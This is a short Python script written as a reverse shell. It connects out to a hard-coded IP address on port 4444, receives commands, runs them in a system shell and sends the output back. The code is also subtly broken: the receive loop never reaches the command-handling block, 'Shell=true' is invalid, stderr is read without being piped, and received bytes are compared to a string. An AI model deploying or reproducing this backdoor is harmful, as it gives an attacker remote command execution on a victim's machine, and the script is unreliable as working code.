import socket
import subprocess

def connect():
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.connect(("192.168.64.138" , 4444))

    while True:
        command = sk.recv(1024)

    if "terminate" in  command:
        sk.close()
        print("Connection Closed...!!!")
    else:
        cmd  = subprocess.Popen(command, Shell=true, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        sk.send(cmd.stdout.read())
        sk.send(cmd.stderr.read())

def main():
    connect()

main()
